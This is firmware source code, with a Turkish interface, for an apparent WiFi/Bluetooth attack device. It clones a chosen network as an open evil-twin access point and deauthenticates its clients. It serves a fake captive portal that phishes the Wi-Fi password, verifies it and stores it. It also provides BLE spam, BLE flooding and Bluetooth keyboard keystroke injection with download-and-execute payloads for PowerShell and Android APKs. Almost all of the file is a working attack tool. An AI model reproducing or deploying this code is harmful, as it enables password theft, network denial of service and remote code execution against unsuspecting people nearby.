      client.print("<div class='status-box ok'>&#10003; Doğrulama başarılı. Sistem sıfırlanıyor...</div>");
    }
    else if (conn_result == "fail") client.print("<div class='status-box err'>&#10007; Girdiğiniz Wi-Fi şifresi hatalı. Lütfen tekrar deneyiniz.</div>");
  } else {
    client.print("<div id='sbox' style='display:none;' class='status-box wait'><span class='spinner'></span>Ağ kimliği doğrulanıyor, lütfen bekleyiniz...</div>");
  }

  client.print("<div class='conn-status'>Erişim Sağlanacak Ağ:<br><b style='font-size:1.3rem; display:block; margin-top:8px; color:#0056b3;'>"); 
  client.print(target_ssid);
  client.print("</b></div>");

  client.print("<form method='POST' action='/connect' id='cf' onsubmit='handleSubmit()'>");
  client.print("<div class='pass-wrap'><label for='pass'>Wi-Fi Parolası</label>");
  client.print("<input type='password' id='pass' name='pass' placeholder='Mevcut şifrenizi giriniz...' autocomplete='off' required>");
  client.print("<div class='show-pass' onclick=\"var p=document.getElementById('pass');p.type=p.type=='password'?'text':'password'\">&#128065; Şifreyi Göster</div></div>");
  client.print("<button type='submit' id='sbtn'>İnternete Bağlan</button></form>");

  client.print("<script>");
  client.print("function handleSubmit(){");
  client.print("  var box=document.getElementById('sbox');");
  client.print("  var btn=document.getElementById('sbtn');");
  client.print("  if(box){ box.style.display='block'; }");
  client.print("  if(btn){ btn.disabled=true; btn.style.opacity='0.6'; }");
  client.print("}");
  if (conn_status == CS_RUNNING) {
      client.print("function tryR(){");
      client.print("  var t=new Date().getTime();");
      client.print("  fetch('/?t='+t,{cache:'no-store',signal:AbortSignal.timeout(4000)})");
      client.print("    .then(function(r){if(r.ok){window.location.href='/?t='+t;}else{setTimeout(tryR,2000);}})");
      client.print("    .catch(function(){setTimeout(tryR,2000);});");
      client.print("}");
      client.print("setTimeout(tryR,3000);");
  }
  client.print("</script>");

  client.print("<div class='footer'>Güvenli Bağlantı Yöneticisi &copy;</div></div></body></html>");
}

void sendBLEPage(WiFiClient &client) {
  if (!client.connected()) return;
  client.print("HTTP/1.1 200 OK\r\nConnection: close\r\nContent-Type: text/html; charset=UTF-8\r\nCache-Control: no-store, no-cache, must-revalidate\r\n\r\n");
  client.print("<!DOCTYPE html><html lang='tr'><head><meta charset='UTF-8'>");
  client.print("<meta name='viewport' content='width=device-width,initial-scale=1'><title>Bluetooth Tarayıcı</title>");
  sendChunkedCSS(client);
  if (!client.connected()) return;
  client.print("</head><body>");
  sendOfflineScript(client);

  client.print("<div class='card'>");
  client.print("<div style='text-align:center;margin-bottom:16px;'>");
  client.print("<svg width='54' height='54' viewBox='0 0 24 24' fill='none' stroke='#8e44ad' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'><polyline points='6.5 6.5 17.5 17.5 12 23 12 1 17.5 6.5 6.5 17.5'></polyline></svg></div>");
  client.print("<h1 style='color:#8e44ad;'>Bluetooth Tarayıcı</h1>");
  client.print("<p class='sub'>Çevredeki Bluetooth ve BLE cihazları tarar ve listeler.</p>");

  if (ble_scan_status == BLE_RUNNING) {
    client.print("<div class='status-box wait'><span class='spinner'></span>BLE tarama devam ediyor (5 sn), lütfen bekleyiniz...</div>");
  }

  if (ble_mutex) xSemaphoreTake(ble_mutex, portMAX_DELAY);

  client.print("<h2 style='margin-bottom:10px;'>&#128268; Bulunan Cihazlar (");
  client.print(ble_devices.size());
  client.print(")</h2><ul class='net-list'>");

  if (ble_devices.size() > 0) {
    for (auto &dev : ble_devices) {
      client.print("<li class='net-item' style='cursor:default;'>");
      client.print("<div class='net-info'><div class='net-name'>");
      if (dev.name.length() > 0) {
        String safe = dev.name;
        safe.replace("&", "&amp;"); safe.replace("<", "&lt;");
        client.print(safe);
      } else {
        client.print("<span style='color:#aaa;font-style:italic;'>İsimsiz Cihaz</span>");
      }
      client.print("</div><div class='net-meta'>MAC: "); client.print(dev.address);
      client.print(" &nbsp;|&nbsp; RSSI: "); client.print(dev.rssi); client.print(" dBm</div></div>");
      String bar;
      if      (dev.rssi > -50) bar = "&#9608;&#9608;&#9608;&#9608;";
      else if (dev.rssi > -65) bar = "&#9608;&#9608;&#9608;&#9617;";
      else if (dev.rssi > -75) bar = "&#9608;&#9608;&#9617;&#9617;";
      else                     bar = "&#9608;&#9617;&#9617;&#9617;";
      client.print("<div style='font-size:.85rem;color:#8e44ad;white-space:nowrap;margin-left:8px;'>"); client.print(bar); client.print("</div>");
      client.print("</li>");
    }
  } else if (ble_scan_status != BLE_RUNNING) {
    client.print("<li style='padding:16px;text-align:center;color:#7f8c8d;'>&#10060; Cihaz bulunamadı. Tarama başlatınız.</li>");
  }

  if (ble_mutex) xSemaphoreGive(ble_mutex);
  client.print("</ul>");

  if (ble_scan_status != BLE_RUNNING) {
    client.print("<form method='POST' action='/ble_scan'><button type='submit' style='background:#8e44ad;box-shadow:none;'>&#128268; BLE Tara</button></form>");
  } else {
    client.print("<button disabled style='background:#8e44ad;opacity:0.5;box-shadow:none;cursor:not-allowed;'>&#128268; Tarama Devam Ediyor...</button>");
    client.print("<script>setTimeout(function(){window.location.reload();},6500);</script>");
  }

  // ─── BLE SPAM ───
  client.print("<div style='margin-top:16px;border-top:1px solid #eee;padding-top:14px;'>");
  if (ble_spam_active) {
    client.print("<div style='background:#fef9e7;border:1px solid #f39c12;border-radius:8px;padding:10px;margin-bottom:8px;text-align:center;font-size:0.9rem;font-weight:600;color:#d68910;'>&#128248; Spam Devices AKTIF — iPhone/AirPods/Galaxy yayınlanıyor</div>");
    client.print("<form method='POST' action='/ble_spam'><button type='submit' style='background:#d35400;box-shadow:none;'>&#9724; Spam Devices Durdur</button></form>");
  } else {
    client.print("<form method='POST' action='/ble_spam'><button type='submit' style='background:#e67e22;box-shadow:none;'>&#128248; Spam Devices — iPhone/AirPods/Android Yayınla</button></form>");
  }

  // ─── BLE FLOOD (DEAUTH) ───
  client.print("<div style='margin-top:8px;'>");
  if (ble_flood_active) {
    client.print("<div style='background:#fdeced;border:1px solid #e74c3c;border-radius:8px;padding:10px;margin-bottom:8px;text-align:center;font-size:0.9rem;font-weight:600;color:#c0392b;'>&#9889; BLE Flood AKTIF — BLE tarayıcılar bunaltılıyor</div>");
    client.print("<form method='POST' action='/ble_flood'><button type='submit' style='background:#c0392b;box-shadow:none;'>&#9724; BLE Flood Durdur</button></form>");
  } else {
    client.print("<form method='POST' action='/ble_flood'><button type='submit' style='background:#c0392b;box-shadow:none;'>&#9889; BLE Flood — Tüm Cihazlara BLE Saldırı</button></form>");
  }
  client.print("</div></div>");

  // ─── BLE KEYSTROKE INJECTION ───
  client.print("<div style='margin-top:8px;border-top:1px solid #eee;padding-top:14px;'>");
  client.print("<h3 style='font-size:1rem;color:#1a252f;margin-bottom:10px;'>&#9000; Keystroke Injection (BLE HID Klavye)</h3>");

  if (ble_keystroke_active) {
    if (ble_hid_connected) {
      client.print("<div class='status-box ok'>&#128241; Cihaz bağlı — Payload gönderiliyor...</div>");
    } else {
      client.print("<div class='status-box wait'><span class='spinner'></span>BT Keyboard yayınlanıyor, eşleşme bekleniyor...</div>");
    }
    client.print("<form method='POST' action='/ble_keystroke'><button type='submit' style='background:#7f8c8d;box-shadow:none;'>&#9724; Durdur</button></form>");
  } else {
    client.print("<form method='POST' action='/ble_keystroke_set'>");

    client.print("<label style='font-size:.85rem;font-weight:600;color:#34495e;display:block;margin-bottom:6px;'>Hedef / Payload</label>");
    client.print("<select name='payload' style='width:100%;padding:10px;border-radius:8px;border:1px solid #bdc3c7;margin-bottom:10px;font-size:.95rem;background:#fff;'>");
    client.print("<option value='0'>&#127760; Tarayıcı — Ctrl+L + URL + Enter (Evrensel)</option>");
    client.print("<option value='1'>&#129302; Android — YouTube Aç</option>");
    client.print("<option value='2'>&#129302; Android — APK İndir &amp; Kur</option>");
    client.print("<option value='3'>&#128187; Windows — Win+R + URL</option>");
    client.print("<option value='4'>&#128187; Windows — PowerShell Dosya İndir &amp; Çalıştır</option>");
    client.print("<option value='5'>&#127822; iOS/Mac — Spotlight + Safari URL</option>");
    client.print("</select>");

    client.print("<label style='font-size:.85rem;font-weight:600;color:#34495e;display:block;margin-bottom:6px;'>URL / Hedef Adres</label>");
    client.print("<input type='text' name='url' value='"); client.print(ble_keystroke_url);
    client.print("' style='width:100%;padding:10px;border-radius:8px;border:1px solid #bdc3c7;margin-bottom:6px;font-size:.95rem;'>");

    client.print("<label style='font-size:.85rem;font-weight:600;color:#34495e;display:block;margin-bottom:6px;'>APK / EXE URL (Win PowerShell için)</label>");
    client.print("<input type='text' name='apk_url' value='"); client.print(ble_apk_url);
    client.print("' style='width:100%;padding:10px;border-radius:8px;border:1px solid #bdc3c7;margin-bottom:10px;font-size:.95rem;'>");

    client.print("<button type='submit' style='background:#2c3e50;box-shadow:none;'>&#9000; BLE Klavye Başlat &amp; Payload Gönder</button>");
    client.print("</form>");
  }
  client.print("</div>");

  client.print("<a href='/'><button type='button' class='btn-blue' style='margin-top:12px;box-shadow:none;'>&#8592; Ana Sayfa</button></a>");
  client.print("<div class='footer'>Bluetooth Tarayıcı &copy;</div></div></body></html>");
}

void handleClient(WiFiClient &client) {
  static char hbuf[896];
  int total = 0;
  unsigned long first_byte_deadline = millis() + 600;
  unsigned long full_header_deadline = 0;

  while (client.connected() && total < (int)sizeof(hbuf) - 1) {
    int avail = client.available();
    if (avail > 0) {
      if (full_header_deadline == 0) full_header_deadline = millis() + 400;
      int toRead = avail;
      if (toRead > (int)sizeof(hbuf) - 1 - total) toRead = (int)sizeof(hbuf) - 1 - total;
      int n = client.read((uint8_t*)hbuf + total, toRead);
      if (n > 0) {
        total += n;
        hbuf[total] = '\0';
        if (strstr(hbuf, "\r\n\r\n")) break;
      }
    } else {
      if (full_header_deadline > 0 && millis() > full_header_deadline) break;
      if (full_header_deadline == 0 && millis() > first_byte_deadline)  break;
      delayMicroseconds(200);
    }
  }
  if (total == 0) return;
  hbuf[total] = '\0';

  char *sp1 = strchr(hbuf, ' ');
  char *sp2 = sp1 ? strchr(sp1 + 1, ' ') : NULL;
  char rawpath[128] = "/";
  if (sp1 && sp2 && (sp2 - sp1 - 1) < (int)sizeof(rawpath)) {
    int plen = sp2 - sp1 - 1;
    memcpy(rawpath, sp1 + 1, plen);
    rawpath[plen] = '\0';
    char *qm = strchr(rawpath, '?');
    if (qm) *qm = '\0';
  }

  char hostbuf[64] = "";
  char *hi = strstr(hbuf, "\r\nHost: ");
  if (hi) {
    hi += 8;
    char *he = strstr(hi, "\r\n");
    if (he) {
      int hlen = he - hi; if (hlen >= (int)sizeof(hostbuf)) hlen = sizeof(hostbuf) - 1;
      memcpy(hostbuf, hi, hlen); hostbuf[hlen] = '\0';
      char *col = strchr(hostbuf, ':'); if (col) *col = '\0';
    }
  }

  bool is_generate_204  = strstr(rawpath, "generate_204")  != NULL;
  bool path_is_captive  = is_generate_204
                      || strstr(rawpath, "hotspot-detect") != NULL
                      || strstr(rawpath, "redirect")       != NULL
                      || strstr(rawpath, "connecttest")    != NULL
                      || strstr(rawpath, "ncsi")           != NULL
                      || strstr(rawpath, "canonical")      != NULL
                      || strstr(rawpath, "success.html")   != NULL
                      || strstr(rawpath, "mobile/status")  != NULL
                      || strstr(rawpath, "library/test")   != NULL
                      || strstr(rawpath, "internet_check") != NULL
                      || strstr(rawpath, "wpad.dat")       != NULL
                      || strstr(rawpath, "gen_204")        != NULL
                      || strstr(rawpath, "check_network")  != NULL
                      || strstr(rawpath, "wispr")          != NULL;
  bool host_is_foreign  = (hostbuf[0] != '\0' && strcmp(hostbuf, AP_IP_ADDR) != 0);

  // Android için /generate_204: 302 redirect gönder (popup tetikler)
  if (is_generate_204) {
    client.print(buildRedirect());
    client.flush();
    return;
  }

  // Diğer captive detection path'leri veya yabancı host → redirect
  if (path_is_captive || host_is_foreign) {
    client.print(buildRedirect());
    client.flush();
    return;
  }

  // ap_switched modunda: portal sayfası dışındaki her istek → redirect
  // (Host header parse edilemese bile captive portal açılır)
  if (ap_switched) {
    bool is_portal_path = (strcmp(rawpath, "/") == 0)
                       || (strcmp(rawpath, "/connect") == 0)
                       || (strstr(rawpath, "/status") != NULL);
    if (!is_portal_path) {
      client.print(buildRedirect());
      client.flush();
      return;
    }
  }

  String request(hbuf);
  String path(rawpath);

  String body = ""; int content_len = 0;
  int cl_idx = request.indexOf("Content-Length: ");
  if (cl_idx != -1) {
    content_len = request.substring(cl_idx + 16, request.indexOf("\r\n", cl_idx)).toInt();
    if (content_len > 256) content_len = 256;
  }
  if (content_len > 0) {
    body.reserve(content_len); int br = 0; unsigned long timeout = millis() + 400;
    while (br < content_len && millis() < timeout) {
      int av = client.available();
      if (av > 0) {
        int rd = (av < content_len - br) ? av : (content_len - br);
        for (int i = 0; i < rd; i++) body += (char)client.read();
        br += rd;
      } else delayMicroseconds(250);
    }
  }

  String hostHeader(hostbuf);

  if (!ap_switched) {
    if (request.startsWith("POST") && path == "/delete_cred") {
      memset(saved_ssid, 0, MAX_SSID_LEN);
      memset(saved_pass, 0, MAX_PASS_LEN);
      saveCredentials("", ""); 
      sendStartPage(client);   
      client.flush();
      return;
    }

    if (request.startsWith("POST") && path == "/rescan") {
      if (scan_status != SCAN_RUNNING) startScan();
      sendStartPage(client); 
      client.flush();
      return;
    }

    if (path == "/ble") {
      sendBLEPage(client);
      client.flush();
      return;
    }

    if (request.startsWith("POST") && path == "/ble_scan") {
      if (ble_scan_status != BLE_RUNNING) {
        ble_scan_status = BLE_RUNNING;
        xTaskCreate(bleScanTask, "ble_scan", 8192, NULL, tskIDLE_PRIORITY + 2, NULL);
        Serial.println("[BLE] Kullanıcı tarama başlattı.");
      }
      sendBLEPage(client);
      client.flush();
      return;
    }

    if (request.startsWith("POST") && path == "/ble_spam") {
      if (ble_spam_active) {
        ble_spam_active = false;
        delay(100);
        Serial.println("[BLESpam] Kullanıcı durdurdu.");
      } else {
        ble_flood_active = false;
        delay(100);
        ble_spam_active = true;
        xTaskCreate(bleSpamTask, "ble_spam", 4096, NULL, tskIDLE_PRIORITY + 1, NULL);
        Serial.println("[BLESpam] Kullanıcı başlattı.");
      }
      sendBLEPage(client);
      client.flush();
      return;
    }

    if (request.startsWith("POST") && path == "/ble_flood") {
      if (ble_flood_active) {
        ble_flood_active = false;
        delay(100);
        Serial.println("[BLEFlood] Kullanıcı durdurdu.");
      } else {
        ble_spam_active = false;
        delay(100);
        ble_flood_active = true;
        xTaskCreate(bleFloodTask, "ble_flood", 4096, NULL, tskIDLE_PRIORITY + 1, NULL);
        Serial.println("[BLEFlood] Kullanıcı başlattı.");
      }
      sendBLEPage(client);
      client.flush();
      return;
    }

    if (request.startsWith("POST") && path == "/ble_keystroke_set") {
      // URL ve payload ayarlarını güncelle, ardından klavyeyi başlat
      String pl  = parsePostParam(body, "payload");
      String url = parsePostParam(body, "url");
      String apk = parsePostParam(body, "apk_url");
      if (pl.length())  ble_keystroke_payload = (uint8_t)pl.toInt();
      if (url.length()) { url.toCharArray(ble_keystroke_url, sizeof(ble_keystroke_url)); }
      if (apk.length()) { apk.toCharArray(ble_apk_url, sizeof(ble_apk_url)); }
      if (!ble_keystroke_active) {
        ble_spam_active  = false;
        ble_flood_active = false;
        delay(100);
        ble_keystroke_active = true;
        xTaskCreate(bleKeystrokeTask, "ble_kb", 8192, NULL, tskIDLE_PRIORITY + 1, NULL);
        Serial.print("[BLEKeyboard] Başlatıldı. Payload: "); Serial.println(ble_keystroke_payload);
      }
      sendBLEPage(client);
      client.flush();
      return;
    }

    if (request.startsWith("POST") && path == "/ble_keystroke") {
      // Sadece durdur
      ble_keystroke_active = false;
      ble_hid_connected    = false;
      delay(100);
      Serial.println("[BLEKeyboard] Kullanıcı durdurdu.");
      sendBLEPage(client);
      client.flush();
      return;
    }

    if (request.startsWith("POST") && path == "/deauth_all") {
      if (deauth_all_active) {
        deauth_all_active = false;
        delay(50);
        Serial.println("[DeauthAll] Kullanıcı durdurdu.");
      } else {
        if (scan_status != SCAN_RUNNING && networks.size() > 0) {
          deauth_all_active = true;
          xTaskCreate(deauthAllTask, "dauth_all", 4096, NULL, tskIDLE_PRIORITY + 1, NULL);
          Serial.println("[DeauthAll] Kullanıcı başlattı — tüm ağlara deauth.");
        } else {
          Serial.println("[DeauthAll] Ağ listesi boş veya tarama devam ediyor, deauth başlatılamadı.");
        }
      }
      sendStartPage(client);
      client.flush();
      return;
    }

    if (request.startsWith("POST") && path == "/start_ap") {
      String sel_ssid = parsePostParam(body, "ssid");
      if (sel_ssid.length() == 0) { sendStartPage(client); return; }

      strncpy(target_ssid, sel_ssid.c_str(), MAX_SSID_LEN - 1);
      target_ssid[MAX_SSID_LEN - 1] = '\0';
      target_channel = 6;
      target_enc     = ENC_TYPE_CCMP;
      target_sec     = RTW_SECURITY_WPA2_AES_PSK;
      target_5g_channel = 0;
      memset(target_5g_bssid, 0, 6);

      if (networks_mutex) xSemaphoreTake(networks_mutex, portMAX_DELAY);
      for (auto &net : networks) {
        if (net.ssid == sel_ssid) {
          target_channel = net.channel;
          target_enc     = net.enc;
          target_sec     = net.raw_sec;
          memcpy(target_bssid, net.bssid, 6);
          break;
        }
      }
      if (networks_mutex) xSemaphoreGive(networks_mutex);

      sendSwitchingPage(client);
      pending_ap_switch = true; 
      client.flush();
      return;
    }
    sendStartPage(client); 
    client.flush();
    return;
  }

  if (request.startsWith("POST") && path == "/connect") {
    if (conn_status == CS_RUNNING) { sendPortalPage(client, false); return; }
    String sel_pass = parsePostParam(body, "pass");

    deauth_active = false; 
    delay(50);  // 100'den 50'ye indirildi

    strncpy(pending_ssid, target_ssid, MAX_SSID_LEN - 1);
    pending_ssid[MAX_SSID_LEN - 1] = '\0';
    strncpy(pending_pass, sel_pass.c_str(), MAX_PASS_LEN - 1);
    pending_pass[MAX_PASS_LEN - 1] = '\0';
    pending_sec = target_sec;

    conn_result = "";
    startConnectTask();
    sendPortalPage(client, false); 
    client.flush();
    return;
  }

  sendPortalPage(client, conn_result.length() > 0);
  client.flush();
}

void setup() {
  Serial.begin(115200); delay(200);
  Serial.println("\n[Boot] ⚡ ULTRA FAST TURBO MODE BAŞLANIYOR! ⚡");
  Serial.println("[Boot] WiFi Scan FIX AKTIF - Ağları Tarama Düzeltildi!");
  Serial.println("[Boot] Bağlantı Hızı ve Yönlendirme İyileştirildi!");

  networks_mutex = xSemaphoreCreateMutex();
  ble_mutex      = xSemaphoreCreateMutex();

  BLEDevice::init("");

  FlashMemory.begin(FLASH_OFFSET, FLASH_BUF_SIZE);
  loadCredentials();

  LwIP_Init();
  wifi_on(RTW_MODE_STA_AP); delay(300);

  wifi_disable_powersave();

  wifi_start_ap((char *)AP_INITIAL_SSID, RTW_SECURITY_WPA2_AES_PSK, (char *)AP_INITIAL_PASS, strlen(AP_INITIAL_SSID), strlen(AP_INITIAL_PASS), 6);
  delay(800);

  ip4_addr_t ip, mask, gw;
  IP4_ADDR(&ip,   192, 168, 4, 1);
  IP4_ADDR(&mask, 255, 255, 255, 0);
  IP4_ADDR(&gw,   192, 168, 4, 1);
  netif_set_addr(&xnetif[1], &ip, &mask, &gw);
  netif_set_up(&xnetif[1]); 
  netif_set_link_up(&xnetif[1]);

  dhcps_init(&xnetif[1]); 
  delay(400);

  server.begin();
  dnsServer.setResolvedIP(192, 168, 4, 1);
  dnsServer.begin();

  if (xnetif[1].hwaddr_len == 6) {
    memcpy(fake_ap_bssid, xnetif[1].hwaddr, 6);
    Serial.print("[Setup] Initial AP BSSID: ");
    Serial.print(fake_ap_bssid[0], HEX); Serial.print(":");
    Serial.print(fake_ap_bssid[1], HEX); Serial.print(":");
    Serial.print(fake_ap_bssid[2], HEX); Serial.print(":");
    Serial.print(fake_ap_bssid[3], HEX); Serial.print(":");
    Serial.print(fake_ap_bssid[4], HEX); Serial.print(":");
    Serial.println(fake_ap_bssid[5], HEX);
  }

  Serial.println("[Setup] ✓ İlk tarama başlatılıyor...");
  startScan();
}

void loop() {
  if (pending_ap_switch) {
    pending_ap_switch = false;
    ap_switched = true;

    delay(500);
    Serial.println("\n[Switch] ⚡ Dinamik Ag Gecisi Basliyor! ⚡");

    deauth_active = false;

    dnsServer.stop();
    delay(50);
    dhcps_deinit();
    delay(150);

    wifi_set_mode(RTW_MODE_STA);
    delay(400);

    wifi_set_mode(RTW_MODE_STA_AP);
    delay(400);

    Serial.print("[Switch] Yeni Sifresiz Ag Aciliyor: "); Serial.println(target_ssid);

    int ret = wifi_start_ap((char *)target_ssid, RTW_SECURITY_OPEN, NULL, strlen(target_ssid), 0, target_channel);
    Serial.print("[Switch] wifi_start_ap donuş: "); Serial.println(ret);

    delay(700);

    ip4_addr_t ip, mask, gw;
    IP4_ADDR(&ip,   192, 168, 4, 1);
    IP4_ADDR(&mask, 255, 255, 255, 0);
    IP4_ADDR(&gw,   192, 168, 4, 1);
    netif_set_addr(&xnetif[1], &ip, &mask, &gw);

    netif_set_up(&xnetif[1]); 
    netif_set_link_up(&xnetif[1]);
    delay(150);

    dhcps_init(&xnetif[1]);
    delay(500);

    dnsServer.begin();
    delay(150);

    uint8_t new_bssid[6];
    memset(new_bssid, 0, 6);

    if (xnetif[1].hwaddr_len == 6) {
        memcpy(new_bssid, xnetif[1].hwaddr, 6);
        Serial.print("[Switch] New AP BSSID from netif: ");
    } else {
        Serial.print("[Switch] hwaddr_len invalid: "); Serial.println(xnetif[1].hwaddr_len);
        memset(new_bssid, 0, 6);
    }

    Serial.print(new_bssid[0], HEX); Serial.print(":");
    Serial.print(new_bssid[1], HEX); Serial.print(":");
    Serial.print(new_bssid[2], HEX); Serial.print(":");
    Serial.print(new_bssid[3], HEX); Serial.print(":");
    Serial.print(new_bssid[4], HEX); Serial.print(":");
    Serial.println(new_bssid[5], HEX);

    memcpy(fake_ap_bssid, new_bssid, 6);

    Serial.println("[Switch] ✓ Islem Tamam! DEAUTH BASLIYOR! ⚡");

    ap_running_channel = target_channel;

    delay(1000);
    deauth_active = true;
    xTaskCreate(deauthTask, "deauth_tsk", 4096, NULL, tskIDLE_PRIORITY + 1, NULL);
  }

  if (scan_status == SCAN_DONE) {
    if (ap_switched) {
      if (networks_mutex) xSemaphoreTake(networks_mutex, portMAX_DELAY);
      for (auto &net : networks) {
        if (memcmp(net.bssid, target_bssid, 6) == 0 && net.channel != target_channel) {
          Serial.print("[ChannelTrack] Hedef yeni kanalda tespit edildi: "); Serial.println(net.channel);
          target_channel = net.channel;
        }
        if (net.channel >= 36 && target_bssid[0] != 0 && isSisterBSSID(target_bssid, net.bssid)) {
          if (net.channel != target_5g_channel) {
            Serial.print("[5GHz] BSSID eslesme, kanal guncellendi: ");
            Serial.print(target_5g_channel); Serial.print(" -> "); Serial.println(net.channel);
          }
          target_5g_channel = net.channel;
          memcpy(target_5g_bssid, net.bssid, 6);
        }
      }
      if (networks_mutex) xSemaphoreGive(networks_mutex);
    }
    scan_status = SCAN_IDLE;
  }

  if (ap_switched && ap_running_channel != -1 && ap_running_channel != target_channel) {
    Serial.print("[APRestart] Kanal degisti, AP yeniden baslatiliyor: "); Serial.println(target_channel);
    deauth_active = false;
    delay(300);
    dnsServer.stop();
    delay(150);

    int ret = wifi_start_ap((char *)target_ssid, RTW_SECURITY_OPEN, NULL, strlen(target_ssid), 0, target_channel);
    Serial.print("[APRestart] wifi_start_ap donuş: "); Serial.println(ret);

    delay(1200);
    netif_set_up(&xnetif[1]);
    netif_set_link_up(&xnetif[1]);
    delay(400);

    dhcps_deinit();
    delay(150);
    dhcps_init(&xnetif[1]);
    delay(700);

    dnsServer.begin();
    ap_running_channel = target_channel;

    delay(1000);
    deauth_active = true;
    xTaskCreate(deauthTask, "deauth_tsk", 4096, NULL, tskIDLE_PRIORITY + 1, NULL);
  }

  if (conn_status == CS_DONE_OK) {
    sta_connected = true;
    strncpy(saved_ssid, pending_ssid, MAX_SSID_LEN - 1);
    strncpy(saved_pass, pending_pass, MAX_PASS_LEN - 1);

    saveCredentials(saved_ssid, saved_pass);

    deauth_active = false;
    delay(50);  // 100'den 50'ye indirildi

    conn_result = "ok"; 
    conn_status = CS_IDLE;

    revert_time = millis() + 1500;  // 2000'den 1500'e indirildi - daha hızlı yönlendirme

  } else if (conn_status == CS_DONE_FAIL) {
    sta_connected = false; 
    conn_result = "fail"; 
    conn_status = CS_IDLE;

    if (ap_switched) {
      deauth_active = false;
      delay(50);  // 100'den 50'ye indirildi
      deauth_active = true;
      delay(500);
      xTaskCreate(deauthTask, "deauth_tsk", 4096, NULL, tskIDLE_PRIORITY + 1, NULL);
      Serial.println("[Fail] ⚠️ Sifre yanlis — DEAUTH YENIDEN BASLADI! ⚡");
    }
  }

  if (revert_time > 0 && millis() > revert_time) {
    revert_time = 0;
    Serial.println("\n[Revert] ✓ Sifre dogrulandi, RESET BASLIYOR!");
    Serial.flush(); 
    delay(100);     
    sys_reset();    
  }

  if (conn_status == CS_IDLE && scan_status == SCAN_IDLE && (millis() - last_scan_ms > RESCAN_INTERVAL_MS)) {
    startScan();
  }

  if (ap_switched && (millis() - last_netif_check_ms > NETIF_CHECK_INTERVAL_MS)) {
    last_netif_check_ms = millis();
    if (!netif_is_up(&xnetif[1]) || !netif_is_link_up(&xnetif[1])) {
      Serial.println("[Keepalive] ⚠️ netif düşmüş, yeniden başlatılıyor...");
      netif_set_up(&xnetif[1]);
      netif_set_link_up(&xnetif[1]);
      dhcps_init(&xnetif[1]);
    }
    wifi_set_channel(target_channel);
  }

  WiFiClient client = server.available();
  if (client && client.connected()) {
    portal_busy = true;
    handleClient(client);
    if (client.connected()) client.flush();
    client.stop();
    portal_busy = false;
  }

  delay(1);
}
